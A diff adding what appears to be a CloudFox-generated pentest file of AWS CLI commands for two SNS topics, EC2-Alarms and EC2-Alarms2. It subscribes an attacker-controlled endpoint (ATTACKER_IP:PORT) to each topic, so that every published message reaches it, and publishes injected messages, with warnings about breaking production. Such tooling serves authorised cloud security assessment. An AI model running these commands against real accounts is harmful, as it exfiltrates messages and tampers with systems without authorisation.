@@ -1,0 +1,58 @@
+#############################################
+# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
+# Set the $profile environment variable to the profile you are going to use to inspect the buckets.
+# E.g., export profile=dev-prod.
+#############################################
+
+# -----------------
+# Topic: EC2-Alarms
+# -----------------
+# Subscribe to the topic using an attacker controlled HTTP/HTTPS endpoint
+
+aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --protocol http --notification-endpoint http://ATTACKER_IP:PORT
+aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --protocol https --notification-endpoint https://ATTACKER_IP:PORT
+
+# NOTE: You will have to confirm the subscription using the URL sent to your attacker controlled http service
+# NOTE: Once you have confirmed the subscription, your attacker controlled IP will received all messages published to the topic.
+
+# Publish messages to an existing topic without an attributes file
+
+# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject
+# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the
+# WARNING: messages are consumed, you should leave fuzzing to non-production environments.
+aws --profile $profile --region us-east-1 sns publish --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --message "[INSERT MESSAGE BODY]"
+
+
+# Send message to the topic with attributes file (You'll have to create and populate the file)
+
+# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject
+# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the
+# WARNING: messages are consumed, you should leave fuzzing to non-production environments.
+aws --profile $profile --region us-east-1  sns publish --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --message "[INSERT MESSAGE BODY] --message-attributes file://./file.json"
+
+# ------------------
+# Topic: EC2-Alarms2
+# ------------------
+# Subscribe to the topic using an attacker controlled HTTP/HTTPS endpoint
+
+aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms2 --protocol http --notification-endpoint http://ATTACKER_IP:PORT
+aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms2 --protocol https --notification-endpoint https://ATTACKER_IP:PORT
+
+# NOTE: You will have to confirm the subscription using the URL sent to your attacker controlled http service
+# NOTE: Once you have confirmed the subscription, your attacker controlled IP will received all messages published to the topic.
+
+# Publish messages to an existing topic without an attributes file
+
+# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject
+# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the
+# WARNING: messages are consumed, you should leave fuzzing to non-production environments.
+aws --profile $profile --region us-east-1 sns publish --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms2 --message "[INSERT MESSAGE BODY]"
+
+
+# Send message to the topic with attributes file (You'll have to create and populate the file)
+
+# WARNING: The following command can cause adverse effects in the environment. Like fuzzing a web application, if you inject
+# WARNING: malicious data you might find a vulnerability, but you also might break something. Unless you really know how the
+# WARNING: messages are consumed, you should leave fuzzing to non-production environments.
+aws --profile $profile --region us-east-1  sns publish --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms2 --message "[INSERT MESSAGE BODY] --message-attributes file://./file.json"
+
